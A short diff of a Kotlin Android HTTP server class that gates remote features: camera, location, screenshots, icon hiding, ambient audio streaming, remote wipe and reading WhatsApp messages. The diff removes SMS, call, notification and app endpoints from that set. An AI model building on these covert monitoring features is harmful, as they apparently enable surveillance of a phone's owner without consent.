@@ -47,7 +47,7 @@ class Httpd(ctxIn: Context, private val porta: Int) {
     private val avancado = setOf("/adv-login", "/foto", "/local", "/alarme", "/adv-state", "/galeria", "/media",
         "/geofences", "/geofence-add", "/geofence-remove", "/geofence-toggle", "/geofence-events",
         "/at-estado", "/at-ativar", "/at-desativar", "/at-bloquear", "/at-alarme", "/at-wipe", "/screenshot",
-        "/captura", "/sms", "/calls", "/notifs", "/apps",
+        "/captura",
         "/icone-esconder", "/icone-mostrar", "/icone-estado",
         "/ambiente", "/ambiente-parar", "/ambiente-estado", "/audio-stream", "/audio-dl",
         "/codigos", "/codigos-renovar",
@@ -240,7 +240,7 @@ class Httpd(ctxIn: Context, private val porta: Int) {
                     val limite = (query["n"]?.toIntOrNull() ?: 100).coerceIn(10, 500)
                     if (chave != null) {
                         jsonResp(out, JSONObject()
-                            .put("lista", WhatsAppStore.mensagensConversa(chave, limite))
+                            .put("lista", WhatsAppStore.mensagensConversa(chave, limite, ctx))
                             .put("chave", chave))
                     } else {
                         jsonResp(out, JSONObject()
